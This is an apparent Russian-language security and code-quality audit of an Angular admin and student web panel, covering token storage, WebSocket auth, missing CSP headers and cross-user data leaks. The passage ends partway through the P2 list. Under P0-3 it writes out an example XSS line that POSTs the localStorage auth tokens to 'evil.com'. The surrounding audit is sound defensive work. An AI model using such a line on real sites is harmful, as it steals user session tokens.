# 10. Frontend Web-Panel (Angular) — отчёт аудита

## Сводка

`frontends/web-panel` — Angular 19 SPA, обслуживающая 4 роли (`ADMIN`, `TEACHER`, `STUDENT`, `STUDENT+isHeadman`). Стек: Angular 19.2 standalone + signals + zone.js, Angular Material 19, Tailwind 4, Chart.js/ng2-charts, `@stomp/stompjs` + sockjs-client, Vitest + @testing-library/angular. Сборка `@angular/build:application`, бандл ограничен 1MB initial. Nginx-образ проксирует всё на `/api`. После v9 (Phase 49-57) web-panel стала единой точкой входа: `/login` + `/admin/*` + `/teacher/*` + `/student/*` + `/headman/*`, PWA теперь под `/app/`.

Уровень проработки заметно выше PWA:
- Есть настоящие **role-guards** (`authGuard`, `roleGuard([...])`, `headmanGuard`, `studentGuard`, `guestGuard`) — STUDENT не может открыть `/admin`, headman не может открыть `/teacher` и т. д. Соответствующий фикс P0-3 из PWA в web-panel уже сделан.
- Есть централизованный `NotificationCenterService` (`providedIn: 'root'`, `effect()` по `auth.currentUser()`), который поднимает **один** STOMP-клиент и подписывает на `/topic/group/{gid}` + (для старост) `/topic/group/{gid}/headman`. Авто-dispose при logout.
- `authInterceptor` реализует тот же queue-паттерн для 401→refresh→retry, что и PWA-axios, с тестами (7 кейсов).
- Chunk-load recovery в `main.ts` (один reload за сессию при `ChunkLoadError`).
- `profile.service` `/me` + `ChangePassword` + avatar PATCH — полноценный flow.

Болезненные вещи — те же, что и в PWA (и в некоторых местах хуже):
1. **localStorage для access+refresh** — `STORAGE_KEY='rct.auth.v1'` в `auth.service.ts:14`, как и в PWA. XSS = 7 дней компрометации. Решается cookie-переходом вместе с PWA (см. 09 P0-1).
2. **JWT в query string WebSocket** — `/api/ws?token=...` в трёх местах: `student-stomp.service:88`, `headman-stomp.service:44`, `notification-center.service:135`. Логи nginx + Referer leak — тот же вектор, что и в PWA P0-2.
3. **`atob(parts[1])` без UTF-8 decode** в `auth.service.ts:65` — падает на кириллических claims (сейчас не используется, но фрагильно).
4. **`roleGuard(['STUDENT'])` для headman-маршрутов не проверяет `isHeadman`** (в `app.routes.ts` для `/headman/*` применяется `headmanGuard` — верно). НО: `studentGuard` применяется к `/student/*` и разрешает вход **и headman тоже** (isHeadman — это тот же STUDENT). Это означает, что headman видит одновременно и `/student/*`, и `/headman/*` в BottomNav/Sidebar. Ожидаемое поведение — но создаёт дублирующие экраны (см. P1 ниже).
5. **`STOMP reconnect` переподписывается на `/topic/group/...` заново при каждом onConnect** (тот же P1-6 из PWA). Дубликаты событий после reconnect'а.
6. **`window.prompt` для cancel-reason** в `headman-lessons.component.ts:369` — блокирующий браузерный примитив, на iOS/Android Safari стилизация недоступна, может показаться «сайт завис».
7. **Массовая FormData-отправка в `submitExcuseWithFile`** правильная (без явного Content-Type) — в отличие от PWA P1-11. ✅.
8. **`HeadmanWeeklyJournalComponent.loadWeek` после `getGroupLessons` делает N параллельных `getLessonAttendance`** — при 30 парах в неделю это 30 одновременных HTTP. attendance-reports не пагинируется и не кешируется на бэке (см. 04 P2).
9. **`PromotionPreviewDialogComponent` → `adminApi.promote()`** — идемпотентность/подтверждение решения на сервере есть, но UI не имеет защиты от двойного клика, и нет confirmation token'а (см. P1).
10. **Нет CSP, нет X-Frame-Options, нет Referrer-Policy** в `nginx.conf` — то же, что и в PWA P1-3.

**Счётчики:** **P0 = 4**, **P1 = 16**, **P2 = 20**, **P3 = 12**.

## Структура модуля

```
frontends/web-panel/
├── Dockerfile
├── nginx.conf                          ← SPA fallback без CSP/security headers
├── angular.json                        ← baseHref /, builder @angular/build, budget 1MB
├── proxy.conf.json                     ← localhost:8080 dev proxy
├── package.json                        ← Angular 19.2, Material 19, Tailwind 4, STOMP, Chart.js
├── public/ {favicon.svg, logo.svg, icons/*}
└── src/
    ├── index.html                      ← НЕТ CSP meta; `<base href="/">`
    ├── main.ts                         ← window.global shim + chunk-load recovery
    ├── styles.css + styles/{fonts,tokens,data-surfaces}.css
    ├── test-setup.ts
    └── app/
        ├── app.component.ts            ← шаблон <router-outlet />
        ├── app.config.ts               ← provideRouter + provideHttpClient(authInterceptor) + provideAnimationsAsync + provideNativeDateAdapter + Chart.register(...)
        ├── app.routes.ts               ← 280 строк, все лениво, guard на каждом уровне
        ├── core/
        │   ├── auth/ {auth.service, auth.interceptor, auth.api,
        │   │          authGuard, roleGuard, headmanGuard, studentGuard, guestGuard}
        │   ├── notifications/ {notification-center.service, notification-bell.component}
        │   ├── profile/ {profile.service, profile-dialog.*, avatar.component, preset-avatars}
        │   └── theme/ {theme.service, theme-toggle.component}
        ├── layout/
        │   ├── shell/ {shell.component + student-pwa-banner + MatProgressBar}
        │   ├── header/
        │   └── sidebar/
        ├── features/
        │   ├── login/
        │   ├── not-found/
        │   ├── admin/ {dashboard, users, groups (+ group-history + promotion-preview + assign-headman + revoke-headman + delete-group),
        │   │            semesters, shared/{admin-api.service, role-chip, status-chip, types}}
        │   ├── teacher/ {dashboard, journal (api, page, grid, cell, status-legend), stats (page, subject-chart, overall-stat-card, stats-utils)}
        │   ├── student/ {dashboard (next-lesson-card, redzone-warning), schedule (page, lesson-row, week-utils),
        │   │             checkin (component, checkin-error-mapper), homework (page, day/week/month-view, homework-item),
        │   │             notifications (page, notification-item), excuses (page, excuse-form-dialog),
        │   │             late-checkin (page), profile (page), stats (page, overall-card, subject-chart),
        │   │             shared/{student-api.service, student-stomp.service, subject-cache.service,
        │   │                     student-notification-badge.service, student-banner.service,
        │   │                     student-schedule.types, format-load-error}}
        │   └── headman/ {dashboard, headman-placeholder (МЁРТВЫЙ), group (+assign-assistant +delete-assistant),
        │                 subjects (list + dialog + delete-dialog), homework (page + inline-form + api),
        │                 journal (page, grid), weekly-journal, schedule (page + slot-dialog + one-off-dialog),
        │                 lessons, excuses, late-checkin, stats,
        │                 shared/{headman-api.service, headman-stomp.service, excuse.types, late-checkin.types}}
        └── shared/ {confirm-dialog, homework-card, segmented-control, week-navigator, attendance-symbols}
```

Размер: **~240 TS + HTML + CSS файлов**, ~20 000 строк. Самый большой модуль — `headman-api.service.ts` (457 строк, 30+ методов).

---

## Критичные проблемы (P0)

### P0-1: 🔧 TO-FIX через JWT cookie — JWT в `localStorage` — тот же вектор XSS, что и PWA
**Статус (2026-04-18):** будет закрыто фиксом C0-7 (HttpOnly cookie + access in-memory). См. `OWNER-ANSWERS.md` 02-Q-frontend-security.


- **Где:** `core/auth/auth.service.ts:14, 21-49, 77-112` (ключ `rct.auth.v1`, 7-дневный refresh).
- **Что:** полностью идентичная схема с PWA (09 P0-1). access+refresh пишутся одним JSON-блобом в localStorage и остаются там 7 дней. Web-panel использует Angular Material + десятки сторонних Angular-компонентов (@angular/material 19.2 тянет трипл-N транзитивных зависимостей) — поверхность для supply-chain атаки широкая.
- **Риск:** один XSS/скомпрометированный пакет = 7 дней полного доступа, включая admin (web-panel обслуживает всех четырёх). Admin-сессия особо опасна — у неё есть `/admin/groups/promote` (массовое перемещение групп) и `/admin/users` с создаваемыми `initialPassword`.
- **Как чинить:** вместе с PWA переезжать на **HttpOnly-cookie для refresh** + in-memory access. Для Angular это даже проще: `withCredentials: true` в `provideHttpClient`; серверный `Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Strict; Path=/api/auth`. `authInterceptor` сейчас дёргает `authApi.refresh(refreshToken)` с телом — надо перейти на body-less refresh (backend читает cookie).
- **Зависимости:** 09 P0-1 (один фикс на оба фронта), 07 Gateway P1 (CORS `credentials:true` с конкретным Origin, не `*`).

### P0-2: 🔧 TO-FIX через WS-ticket — JWT в query string WebSocket (три места)
**Статус (2026-04-18):** будет закрыто фиксом C0-7 — WS-ticket. Все 3 STOMP-клиента переключаются на `?ticket=<uuid>`. См. `OWNER-ANSWERS.md` 02-Q-frontend-security.


- **Где:** `features/student/shared/student-stomp.service.ts:88`, `features/headman/shared/headman-stomp.service.ts:44`, `core/notifications/notification-center.service.ts:135` — все `new SockJS(\`/api/ws?token=${...}\`)`.
- **Что:** токен пишется в URL, оседает в логах nginx/Gateway, в `Referer`, в DevTools Network. Полная аналогия с 09 P0-2. Комментарий в `student-stomp.service:32-57` гордо декларирует «T-51-01: NEVER logs the full URL», но сам URL живёт в логах nginx `access.log` независимо от приложения.
- **Риск:** compromised log = токен.
- **Как чинить:** переключиться на STOMP `connectHeaders: { Authorization: 'Bearer ...' }` (SockJS транспорт поддерживает только sockjs-info handshake, поэтому для `withSockJS()` придётся либо использовать native WebSocket, либо short-lived ws-ticket endpoint на auth-service: `POST /auth/ws-ticket` → `{ticket}` → `/api/ws?ticket=...`, серверный interceptor меняет ticket на userId).
- **Зависимости:** 09 P0-2 — общее решение.

### P0-3: Нет CSP / security headers в nginx.conf — открыто окно для XSS и clickjacking
- **Где:** `nginx.conf:1-32`. Единственные заголовки — `Cache-Control`/`Pragma`. Нет `Content-Security-Policy`, нет `X-Frame-Options`, нет `X-Content-Type-Options`, нет `Referrer-Policy`, нет `Permissions-Policy`.
- **Что:** admin-панель принимает любой inline `<script>`, любой `<img src="http://evil">`, может быть загружена в iframe на внешнем сайте (`X-Frame-Options: SAMEORIGIN` отсутствует → clickjacking). При XSS (например, через сырое отображение `ticket.comment`, `group.name`, `subject.name`, `lesson.cancelReason` — все текстовые поля юзерского ввода) — атакующий делает `fetch('https://evil.com', {method:'POST', body: localStorage.getItem('rct.auth.v1')})` без CSP-барьера.
- **Риск:** для admin-экранов — особо критично; `/admin/users` создаёт пользователей с `initialPassword`, `/admin/groups/promote` массово меняет состояние.
- **Как чинить:** добавить в `nginx.conf`:
  ```nginx
  add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self' data:; img-src 'self' data: https:; connect-src 'self' wss://ruttrack.site https://ruttrack.site; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;
  add_header X-Frame-Options "DENY" always;
  add_header X-Content-Type-Options "nosniff" always;
  add_header Referrer-Policy "strict-origin-when-cross-origin" always;
  add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
  ```
  Angular Material тянет **inline-style**'s (ripple и overlay) — `style-src 'unsafe-inline'` неизбежно; script-src можно сделать строгим, потому что Angular CLI не инжектит inline-скрипты в prod-build.
- **Зависимости:** тестировать в preview — Chart.js рисует canvas, не нуждается в `'unsafe-eval'`; Angular AoT prod-build тоже без eval.

### P0-4: 🔧 TO-FIX через logout cleanup — Нет `logout` clean-up для `sessionStorage` истории уведомлений
**Статус (2026-04-18):** будет закрыто фиксом C0-5 — общий `clearAllClientState()` чистит `sessionStorage.clear()` + push unsubscribe + caches. См. `OWNER-ANSWERS.md` 02-Q-frontend-security.


- **Где:** `core/notifications/notification-center.service.ts:97-112, 153-159`; `core/auth/auth.service.ts:124-135`.
- **Что:** `NotificationCenterService` пишет `NotificationRecord[]` в `sessionStorage` (`STORAGE_KEY='rct-global-notifications'`). При logout `auth.service.clearTokens()` чистит localStorage + state, **но не очищает sessionStorage**. `effect()` на смену `currentUser()` вызывает `disconnect()` STOMP — но записи в `_items` остаются в signal, и в sessionStorage они тоже живы. При входе **другого пользователя в той же вкладке** (без F5) — старые записи (в т. ч. headman-only события с именами студентов и типами пропусков) видны новому юзеру. Особо чувствительно: `late_checkin.decided`/`excuse.decided` с user-scoped данными пересекаются.
- **Риск:** cross-user data leak на общем устройстве (деканат, лаборантская). Имена студентов в `excuse.requested` payload'е — ПДн.
- **Как чинить:** в `AuthService.clearTokens()` вызвать `NotificationCenterService.clear()` (уже есть метод) и дополнительно удалить ключ `sessionStorage.removeItem('rct-global-notifications')`. Плюс в `effect()` `notification-center.service.ts:97-112` при `user === null` — `this._items.set([])` + `this.persist()`. Сейчас только `disconnect()`.
- **Зависимости:** ничто.

---

## Серьёзные проблемы (P1)

### P1-1: `auth.service.parseJwt` не декодирует UTF-8 и не валидирует payload shape
- **Где:** `auth.service.ts:59-75`.
- **Что:** `JSON.parse(atob(parts[1]))` — работает только для ASCII. Если backend когда-либо положит в JWT поле с кириллицей (`firstName`, `lastName`) — `atob` бросит `InvalidCharacterError`. Плюс — `payload.role as string` — приведение без валидации; если JWT подделан (см. P0-1 — попадает вместе с localStorage-проблемой), `role` может быть любой строкой, `currentUser().role.toUpperCase()` создаст несуществующее значение UI, роут-guards сравнивают через `includes()`, «chaos mode».
- **Как чинить:** заменить на `TextDecoder('utf-8').decode(Uint8Array.from(atob(base64).split(''), c => c.charCodeAt(0)))`. Добавить zod/io-ts валидатор payload'а или простую проверку `['ADMIN','TEACHER','STUDENT'].includes(role)` → иначе `clearTokens()`.

### P1-2: Навигация-queue в `authInterceptor` теряется при deactivate компонента
- **Где:** `core/auth/auth.interceptor.ts:43-55`.
- **Что:** когда 401 приходит параллельно нескольким запросам, они пушатся в `pendingRequests: Array<{resolve, reject}>`. Если пользователь в этот момент уходит со страницы, компонент раскрывает subscription, но `pendingRequests[i]` уже захватил замыкание с `next` observable для **текущего** HttpClient-pipeline — memory-leak потенциальный и потенциальная гонка: когда refresh завершается, queue resolvers вызывают `next(retried)` на отписанных observables → тестами не ловится. В `authInterceptor.spec.ts:122-147` проверяется счётчик `results.length === 2`, но не ловится leak.
- **Как чинить:** хранить в очереди `AbortController` или `takeUntil(destroy$)` на уровне вызова. Практически — ввести `HttpContext` с флагом, запрашивающий компонент цепляет `destroyRef.onDestroy(() => { pendingRequests = pendingRequests.filter(p => p.req !== req) })`.

### P1-3: Нет централизованной обработки 403/404/5xx — каждый компонент делает свой `catchError`
- **Где:** ~20 компонентов (`admin/users`, `admin/groups`, `headman/*`, `student/*`) каждый отдельно пишет `this.snackBar.open('Не удалось...')`.
- **Что:** (а) дублирование кода, (б) разный UX (в одних местах snackBar, в других — inline error, в третьих — молча swallow). При 403 во многих местах показывается «Не удалось загрузить» — пользователь не понимает, что он нажал на запрещённый endpoint. При 5xx — тот же текст.
- **Как чинить:** добавить второй interceptor `errorInterceptor` после `authInterceptor`, который маппит status → централизованное сообщение и шлёт в `MatSnackBar` через глобальный `ErrorNotificationService`. Оставить только кастомные сообщения для 409/422 (конфликты бизнес-логики).

### P1-4: `role.guard.ts` при неудаче редиректит через `resolveDashboardFor` — но если пользователь в бесконечном цикле (например, TEACHER пытается на `/admin`, редиректим на `/teacher/dashboard`, но TEACHER не аутентифицирован и тут же отскакивает на `/login`), возможны кольца
- **Где:** `core/auth/role.guard.ts:16`.
- **Что:** маловероятно, но есть кейс: authGuard пропускает (токен есть), roleGuard видит `user.role='TEACHER'` но route requires 'ADMIN' → `createUrlTree(['/teacher/dashboard'])` → path matches, teacher route has `roleGuard(['TEACHER'])` → allow → рендер. Если же `currentUser()===null` (JWT malformed) — редирект на `/login`, а там `guestGuard` разрешает (isAuthenticated=false) → ок. Но если `isAuthenticated=true` (есть _токен_) но `currentUser()=null` (parse error) — `authGuard` пускает, `roleGuard` редиректит на `resolveDashboardFor(null) = '/login'`, `guestGuard` редиректит обратно на `resolveDashboardFor(null) = '/login'` → flicker. Проверить конкретный сценарий сложно, но логика хрупкая.
- **Как чинить:** при `currentUser()===null` в любом guard'е — `clearTokens()` + `navigate(['/login'])`. Единая «если токен есть, но не парсится — зачищаем».

### P1-5: `HeadmanStompService`, `StudentStompService`, `NotificationCenterService` — три параллельных STOMP-клиента на одну и ту же вкладку
- **Где:** `student-stomp.service.ts`, `headman-stomp.service.ts`, `notification-center.service.ts`.
- **Что:** при заходе старосты на `/student/checkin` (он же студент) поднимаются **все три**: `StudentStompService` подписывается на `/topic/group/X` (для attendance.marked), `NotificationCenterService` — на `/topic/group/X` + `/topic/group/X/headman`, `HeadmanStompService` — тоже на `/topic/group/X/headman`. Итог: 3 сокета на вкладку, одни и те же события приходят 2-3 раза.
- **Как чинить:** консолидировать в один `NotificationCenterService` (он уже имеет `onEvent$` — raw поток). `StudentStompService.marked$` превратить в производный `center.onEvent$.pipe(filter(e => e.type === 'attendance.marked'))`, `HeadmanStompService.lateCheckinRequested$` — аналогично. Удалить два лишних сокета.

### P1-6: STOMP reconnect не отписывается от предыдущих subscriptions
- **Где:** `student-stomp.service.ts:90-102` + `notification-center.service.ts:137-144` + `headman-stomp.service.ts:46-59`.
- **Что:** `onConnect` каждый раз делает `client.subscribe(...)`. При reconnect старая подписка остаётся живой в клиенте — каждое событие приходит N+1 раз после N реконнектов. Тот же паттерн, что и 09 P1-6.
- **Как чинить:** сохранить возвращаемые `Subscription`-объекты в поле, в `onWebSocketClose` → `subscription.unsubscribe()` перед новым `subscribe`.

### P1-7: `notification-center.service.ts` effect-зависимость — `user` (объект), а не отдельные поля
- **Где:** `notification-center.service.ts:97-112` — `effect(() => { const user = this.auth.currentUser(); ... })`.
- **Что:** `currentUser()` — computed из `accessToken`. Он дёргается на **каждое** изменение токена (в том числе refresh раз в 15 минут). Каждый refresh приводит к: `disconnect() → new Client(...) → activate()`. В окне disconnect/connect (500-1000мс) события теряются. Те же симптомы, что в 09 P1-4.
- **Как чинить:** не хранить токен внутри computed — ввести «стабильный» `userIdentity` computed, возвращающий `{id, groupId, isHeadman}` без токена; effect зависит только от него. Токен читается getter'ом в `webSocketFactory`.

### P1-8: `HeadmanWeeklyJournalComponent` запрашивает attendance параллельно N раз
- **Где:** `features/headman/weekly-journal/headman-weekly-journal.component.ts:217-246`.
- **Что:** после `getGroupLessons` делается `forkJoin(normalised.map(l => this.headmanApi.getLessonAttendance(l.id)))`. При 30 парах в неделе — 30 параллельных `GET /attendance/reports/lesson/{id}`. Бэкенд-endpoint без кэша (см. 04 attendance P2). На n=30 * 25 студентов = 750 строк join'а в одном запросе — и так 30 раз.
- **Как чинить:** добавить backend-bulk endpoint `GET /attendance/reports/lessons/bulk?ids=1,2,3,...` либо `GET /attendance/reports/group/{gid}/week?from=&to=` с одним JSON (все пары + все студенты). На фронте — `of(ids)`+`mergeMap(batch, concurrency=5)` чтобы не DDoS'ить собственный бэкенд, пока bulk не появится.

### P1-9: `HeadmanLessonsComponent.onCancel` использует `window.prompt`
- **Где:** `features/headman/lessons/headman-lessons.component.ts:368-395`.
- **Что:** блокирующий браузерный примитив; на iOS Safari выглядит криво; не даёт валидацию длины в реальном времени (проверка `>512` post-hoc); нет textarea для длинного текста; не поддерживает многострочность. Никак не согласуется с остальным дизайном Material-диалогов в этом же проекте.
- **Как чинить:** заменить на `MatDialog.open(CancelLessonDialogComponent, {data:{lesson}})` с textarea `[formControl]="reasonCtrl"` + `Validators.required, Validators.maxLength(512)`. В проекте уже есть `ConfirmDialogComponent`; сделать параметризированный вариант.

### P1-10: `PromotionPreviewDialogComponent` → `admin-api.promote()` без CSRF/idempotency-token
- **Где:** `features/admin/groups/promotion-preview-dialog/*`; `features/admin/shared/admin-api.service.ts:106-108`.
- **Что:** `POST /api/academic/groups/promote` — массово поднимает все группы на +1 курс. Это *деструктивная* админская операция. Два быстрых клика (или retry пользователя при вялой сети) — два promote'а. Сейчас UI полагается только на client-side `loading` signal.
- **Как чинить:** (а) backend должен возвращать dry-run-token из preview, promote принимает его как `Idempotency-Key`, повторный тот же → 200 с кэшированным ответом. (б) UI блокирует кнопку до завершения, показывает "Обрабатывается..." 3+ секунды чтобы пользователь не кликал. (в) подтверждение «напишите PROMOTE в поле» перед финальным действием.

### P1-11: Нет loading-индикатора между route-change → `loadComponent()`
- **Где:** `shell.component.ts:42-58` — есть `MatProgressBar`, но `Suspense`-семантика Angular Router работает иначе: `NavigationStart → NavigationEnd` включает **прокси-latency** загрузки chunk'а, отключая `navigating=true`, но при *быстром* переходе progress-bar не успевает отрисоваться — глаз видит 200мс «замороженного» экрана без индикатора. Также: при ошибке lazy-load'а (ChunkLoadError) `NavigationError` триггерит `navigating=false`, но fallback логика в `main.ts` уже редиректит — прогресс-бар прячется до reload'а, юзер видит белый экран.
- **Как чинить:** добавить нижний порог (min 300ms show), либо skeleton-ы на уровне самих feature-компонентов.

### P1-12: `student-notifications.component.ts:sortedItems` сортирует по `receivedAt.getTime()` — но `receivedAt` — ISO-строка из storage
- **Где:** `student-notifications.component.ts:49-51` + `toItem()` конвертер `:63-71`.
- **Что:** `toItem` уже конвертирует `receivedAt` → `new Date(record.receivedAt)`. Сортировка корректна. НО: если строка невалидна (битый JSON из storage) — `Date.getTime()` возвращает `NaN`, сортировка ломается, item'ы перемешиваются. Низкая критичность, но пользователь видит случайный порядок.
- **Как чинить:** validate ISO в `loadFromStorage` (см. `notification-center.service.ts:201-211`) — уже есть try/catch, но не проверяет `Date.isNaN`.

### P1-13: Admin `/groups/promote/preview` и `/promote` не связаны идемпотентно
- Дубль **P1-10**, перенесён в общий поток.

### P1-14: `HeadmanExcusesComponent.enrichLessons` делает extra N+M запросов (lessons + subjects)
- **Где:** `features/headman/excuses/headman-excuses.component.ts:413-483`.
- **Что:** на каждое открытие страницы тикетов: `GET /api/schedule/groups/{gid}/lessons?dateFrom=(-30d)&dateTo=(+14d)` + N * `GET /academic/subjects/{id}` (через `SubjectCacheService` — кэш помогает, но первый раз даёт N запросов). Headman группы 30 чел × 10 предметов — десятки запросов на один обзор. Никакой пагинации, всё в одном batch.
- **Как чинить:** бэкенд возвращает `ExcuseTicket` **с полным составом lessons** (lessonId + lessonNumber + date + subjectId + subjectName). Один DTO заменяет две лавины запросов.

### P1-15: `HeadmanLateCheckinComponent` и `StudentLateCheckinComponent` переподписываются на `center.onEvent$` без фильтра user_id
- **Где:** `features/headman/late-checkin/headman-late-checkin.component.ts:229-236`, `features/student/late-checkin/student-late-checkin.component.ts:96-102`.
- **Что:** компонент подписан на `center.onEvent$` (raw поток всех событий) и фильтрует только по `envelope.type`. Но `center.handleFrame` уже выбрасывает USER_SCOPED_TYPES с чужим `user_id`, так что на этот поток не попадут чужие `decided`. Всё ок; но **нет фильтра по groupId** — если в будущем пользователь сменит группу внутри одной сессии (сейчас невозможно), мог бы получить чужие события. Это страховка на будущее.
- **Как чинить:** добавить optional `groupId` в envelope и проверять в handler'е.

### P1-16: `logout` не отменяет in-flight HTTP запросы
- **Где:** `core/auth/auth.service.ts:137-148`.
- **Что:** при logout мы navigate('/login'), но все текущие XHR (например, `getStudentRecords`, `listGroups`) продолжают лететь. `authInterceptor` видит 401 на пост-logout запросах → снова запускает refresh → всё падает в цепочку. В теории сессия уже убита, на практике — кратковременные race conditions «после logout прилетел ответ, компонент его закэшировал».
- **Как чинить:** ввести глобальный `AbortController` в `AuthService`, `authInterceptor` прикрепляет `signal` к каждому запросу, при logout — `controller.abort()`. Или проще — при logout `window.location.replace('/login')` (hard reload), но теряется преимущество SPA.

---

## Средние (P2)

### P2-1: Два дублирующих sidebar entries у старосты — «Главная» (student) и «Кабинет старосты» (headman)
- **Где:** `layout/sidebar/sidebar.component.ts:88-93, 179-185`.
- **Что:** у STUDENT+isHeadman в sidebar видны **и** `/student/dashboard` **и** `/headman/dashboard`. Две «главные». Оба ведут на осмысленные страницы, но в ментальной модели пользователя — одна главная.
- **Как чинить:** дизайн-решение: либо убрать student-dashboard для isHeadman (staroste он не нужен), либо переименовать headman-dashboard в «Старостат». Простейший fix — скрыть primary item `/student/dashboard` при isHeadman=true: `primaryItems` стаёт `computed()` с фильтром.

### P2-2: `/headman/homework` и `/student/homework` — два отдельных маршрута с сильно похожей логикой
- **Где:** `features/headman/homework/headman-homework.component.ts` и `features/student/homework/student-homework.component.ts`.
- **Что:** старосте вдобавок показывается CRUD inline-form; студенту — только read-only + mark-complete. Код на 80% дублируется (фильтр по semester/groupId, вычисления, подписка на api). Согласованность расписания с PWA (в `SchedulePage.LessonHomeworkSection` в PWA есть inline-CRUD прямо в расписании) — в web-panel этого нет.
- **Как чинить:** единый `<app-homework-page [readonly]="!isHeadman">`, внутренние sub-компоненты скрываются по флагу.

### P2-3: `HeadmanJournalGridComponent` не валидирует `JournalCell.lessonId` перед `markAttendance`
- **Где:** `features/headman/journal/headman-journal-grid/headman-journal-grid.component.ts:363-385`.
- **Что:** `setStatus` сразу вызывает backend. Если cell.lessonId === undefined (если backend вернул сломанный DTO) — PUT улетит на `/api/attendance/lessons/undefined/...` → 400. Есть guard `if (!cell.lessonId ...) return` — ок. Но `cell.status === next` блок — не обновляет symbol на backend-актуальный (то же значение уже там), но silent-return'ит — это ок.
- **Nit:** при неудачном rollback `setErrors` не чистится; повторный клик не пробует снова.

### P2-4: `AdminDashboardComponent` sparkline-графики рисуются из **фейковых** чисел, не из реальной динамики
- **Где:** `features/admin/dashboard/admin-dashboard.component.ts:196-211` (`buildSpark`).
- **Что:** sparkline на карточках «Студенты», «Преподаватели» — **синтетические** ряды. Они выглядят как time-series, но на самом деле это `sin((target + i) * 1.7)`. Админ, увидев рост, подумает, что за неделю прибавилось студентов — а это просто ось.
- **Риск:** misleading UI для админа, может принять неверные решения.
- **Как чинить:** либо убрать sparkline'ы до появления настоящего endpoint'а `/dashboard/trends`, либо подписать явно «Демо-график / реальный отсутствует». Chart «посещаемость за 7 дней» (`chartData` в том же файле) — тоже фейк.

### P2-5: `StudentScheduleComponent.nextWeek` позволяет бесконечно листать в будущее
- **Где:** `features/student/schedule/student-schedule.component.ts:288-292`.
- **Что:** нет лимита, можно листать на 2027, 2030. `getWeekLessons` вернёт пустой ответ → пустые дни. Пустая неделя-за-неделей — плохой UX (пользователь не понимает, почему расписание «пропало»).
- **Как чинить:** клеймить по диапазону активного семестра (`studentApi.getActiveSemesterId()` → получить даты → в `weekLabel` пометить `вне семестра`, `nextWeek` при превышении ничего не делает). Или хотя бы toast «Расписание на эту неделю ещё не опубликовано».

### P2-6: `HeadmanScheduleComponent` пересчитывает `subjectName` из кэшированного subjects-списка на каждый render
- **Где:** `headman-schedule.component.ts:465-467` — `this.subjects().find(s => s.id === subjectId)?.name`.
- **Что:** при матрице 6×8=48 ячеек, каждый рендер — 48 `Array.find()`. На большом списке предметов ≥ 50 — 48 × 50 = 2400 итераций на один change detection. Не критично сейчас, но с OnPush'ем и signals должна быть `Map<id, name>`, computed один раз.

### P2-7: `HeadmanGroupComponent.students()` возвращает `any[]` — нет типизации
- **Где:** `features/headman/group/headman-group.component.ts:247-270`.
- **Что:** ни `Student`, ни `Assistant` не описаны как интерфейсы; template делает `s.fullName`, `s.login`, `s.headman` без компилер-проверок. Регрессия типа `fullName` → `full_name` на backend пройдёт тихо.
- **Как чинить:** вытащить types из `headman-api.service` (сейчас почти все методы возвращают `Observable<any>` — P3-1 аналог из PWA).

### P2-8: `HeadmanApiService` везде использует `Observable<any>` кроме нескольких типизированных методов
- **Где:** `features/headman/shared/headman-api.service.ts:45, 52, 63, 177, 184-196, 205, 217, 225, 234, 261-264, 272-280, 287-289, 298-304, 308-324, 332-354, 367-403, 413-420, 426-428, 434-454`.
- **Что:** 30+ методов возвращают `any`. Компонент-потребители сами кастуют. Любая рассинхронизация с бэкендом (переименование поля) проходит компиляцию и ловится только в рантайме.
- **Как чинить:** импортировать типы из `features/admin/shared/types.ts` и `features/headman/excuses/excuse.types.ts`; для остальных — создать `features/headman/shared/types.ts` с `GroupMember`, `Assistant`, `Subject`, `ScheduleItem`, `LessonAttendance` и т.д.

### P2-9: `theme.service.ts` хранит `ruttrack.theme` в localStorage — параллельно с `rct.auth.v1`, и не чистится при logout
- **Где:** `core/theme/theme.service.ts:17-22, 52-55`.
- **Что:** тема сохраняется per-browser глобально. Не критично (не секрет), но если следующий пользователь устройства хочет свою тему — его первый заход откроет dark-тему предыдущего. **Ожидаемое поведение** для shared устройства в вузе? Спорно.
- **Как чинить:** либо оставить как есть и задокументировать, либо сбрасывать в `logout`.

### P2-10: `subject-cache.service.ts` не имеет TTL и не инвалидируется при CRUD предмета старостой
- **Где:** `features/student/shared/subject-cache.service.ts:20-48`.
- **Что:** старосте `createSubject/updateSubject` инвалидирует `loadSubjects()` в компоненте, но `SubjectCacheService.cache` (`Map<number, Observable<string>>`) живёт пока не перезагружена вкладка. Староста переименовывает предмет → студенты в той же вкладке видят старое имя в расписании пока не F5. В большинстве случаев у старосты и студента — разные вкладки, но если староста сидит в web-panel как student (он же студент), это та же сессия.
- **Как чинить:** добавить `invalidate(id: number)` в сервис, вызывать из `HeadmanSubjectsComponent` после CRUD.

### P2-11: `profile.service.updateAvatar` PATCH'ит `/users/me/avatar` — backend может не существовать
- **Где:** `core/profile/profile.service.ts:69-73`.
- **Что:** `avatarId: string | null` — нет проверки что это подмножество preset-аватаров (см. `preset-avatars.ts`). Можно подать произвольную строку. Backend должен валидировать, но UI должен первым фильтровать.
- **Как чинить:** типизировать `avatarId` через enum/union: `'avatar1'|'avatar2'|null`.

### P2-12: `admin-dashboard.component.ts` chart options захардкожены в цветах `rgba(0, 229, 160, 1)` — не адаптируется к светлой теме
- **Где:** `admin-dashboard.component.ts:94-114, 127-130`.
- **Что:** `--accent-primary` toggles light/dark через `tokens.css`, но в chart.js они зафиксированы. Light-тема → зелёный на белом контраст ок, но tooltip `backgroundColor: 'rgba(26, 34, 54, 0.96)'` — это dark bg. В light-теме tooltip выглядит как тёмное пятно.
- **Как чинить:** читать CSS-переменные через `getComputedStyle(document.documentElement).getPropertyValue('--accent-primary')` в effect, пересобирать chartOptions на смену темы.

### P2-13: ✅ ACCEPTED — `UsersPageComponent.showInitialPasswordColumn` — initialPassword видим в таблице
**Статус:** by design (см. `OWNER-ANSWERS.md` 10-Q7 + 01-Q1, 2026-04-18). Колонка с открытым паролем — заявленная фича для админа (помогает повторно сообщить пароль студенту, потерявшему Telegram). Скрытая колонка с кнопкой «Показать» НЕ внедряется. Ниже — оригинальное описание.


- **Где:** `features/admin/users/users-page.component.ts:72-83`; `admin-api.service.ts:40` возвращает `UserResponse` включая `initialPassword`.
